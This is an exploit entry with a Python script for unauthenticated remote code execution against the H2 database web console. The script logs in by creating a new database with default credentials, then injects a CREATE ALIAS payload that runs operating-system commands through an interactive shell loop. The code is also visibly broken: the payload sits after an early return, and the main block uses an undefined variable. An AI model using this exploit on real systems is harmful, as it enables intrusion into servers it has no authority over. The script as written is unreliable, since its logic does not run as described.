# Exploit Author: h4ckNinja
# Vendor Homepage: https://www.h2database.com/
# Software Link: http://www.h2database.com/h2-2018-03-18.zip
# Version: 1.4.196 and 1.4.197
# Tested on: macOS/Linux
# CVE: N/A
 
# This takes advantage of the CREATE ALIAS RCE (https://www.exploit-db.com/exploits/44422/). 
# When the test database has a password that is unknown, it is still possible to get the execution 
# by creating a new database. The web console allows this by entering the name of the new database 
# in the connection string. When the new database is created, the default credentials of 
# username “sa” and password “” (blank) are created. The attacker is logged in automatically. 
# The attached Python code, modified from 44422, demonstrates this.
 
#!/usr/bin/env python
 
&#039;&#039;&#039;
Exploit Title: Unauthenticated RCE
Date: 2018/09/24
Exploit Author: h4ckNinja
Vendor: http://www.h2database.com/
Version: all versions
Tested on: Linux, Mac
Description: Building on the Alias RCE, there&#039;s an authentication bypass to create a database, and then login to that one.
Modified from: https://www.exploit-db.com/exploits/44422/
&#039;&#039;&#039;
 
import random
import string
import sys
import argparse
import html
import requests
 
 
def getSession(host):
    url = &#039;http://{}&#039;.format(host)
    r = requests.get(url)
    path = r.text.split(&#039;href = &#039;)[1].split(&#039;;&#039;)[0].replace("&#039;","").replace(&#039;.jsp&#039;, &#039;.do&#039;)
 
    return &#039;{}/{}&#039;.format(url, path)
 
def login(url, database):
    data = {
        &#039;language&#039;: &#039;en&#039;,
        &#039;setting&#039;: &#039;Generic H2 (Embedded)&#039;,
        &#039;name&#039;: &#039;Generic H2 (Embedded)&#039;,
        &#039;driver&#039;: &#039;org.h2.Driver&#039;,
        &#039;url&#039;: database,
        &#039;user&#039;: &#039;sa&#039;,
        &#039;password&#039;: &#039;&#039;
    }
 
    print(&#039;[*] Attempting to create database&#039;)
    r = requests.post(url, data=data)
 
    if &#039;<th class="login">Login</th>&#039; in r.text:
        return False
 
    print(&#039;[+] Created database and logged in&#039;)
 
    return True
 
    cmd = &#039;&#039;&#039;CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;&#039;&#039;&#039;
    url = url.replace(&#039;login&#039;, &#039;query&#039;)
 
    print(&#039;[*] Sending stage 1&#039;)
 
    r = requests.post(url, data={&#039;sql&#039;: cmd})
 
    if not &#039;NullPointerException&#039; in r.text:
        print(&#039;[+] Shell succeeded - ^c or quit to exit&#039;)
        return url
 
    return False
 
def execve(url, cmd):
    r = requests.post(url, data={&#039;sql&#039;:"CALL EXECVE(&#039;{}&#039;)".format(cmd)})
 
    try:
        execHTML = html.unescape(r.text.split(&#039;</th></tr><tr><td>&#039;)[1].split(&#039;</td>&#039;)[0].replace(&#039;<br />&#039;,&#039;\n&#039;).replace(&#039;&nbps;&#039;,&#039; &#039;)).encode(&#039;utf-8&#039;).decode(&#039;utf-8&#039;,&#039;ignore&#039;)
        print(execHTML)
 
    except Exception as e:
        print(&#039;[-] Invalid command (&#039; + str(e) + &#039;)&#039;)
 
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    randString = &#039;&#039;.join(random.choices(string.ascii_letters + string.digits, k=5))
 
    parser.add_argument(&#039;-H&#039;,
            &#039;--host&#039;,
            dest=&#039;host&#039;,
            metavar=&#039;127.0.0.1:8082&#039;,
            help=&#039;Specify a host&#039;,
            required=True)
 
    parser.add_argument(&#039;-d&#039;,
            &#039;--database-url&#039;,
            dest=&#039;database&#039;,
            metavar=&#039;jdbc:h2:~/emptydb-&#039; + randString,
            default=&#039;jdbc:h2:~/emptydb-&#039; + randString,
            help=&#039;Database URL&#039;,
            required=False)
 
    args = parser.parse_args()
 
url = getSession(args.host)
 
if login(url, args.database):
 
    if success:
        while True:
            try:
                cmd = input(&#039;h2-shell$ &#039;)
 
                if &#039;quit&#039; not in cmd:
                    execve(success, cmd)
 
                else:
                    print(&#039;[+] Shutting down&#039;)
                    sys.exit(0)
 
            except KeyboardInterrupt:
                print()
                print(&#039;[+] Shutting down&#039;)
                sys.exit(0)
 
    else:
        print(&#039;[-] Something went wrong injecting the payload.&#039;)
 
else:
    print(&#039;[-] Unable to login&#039;)

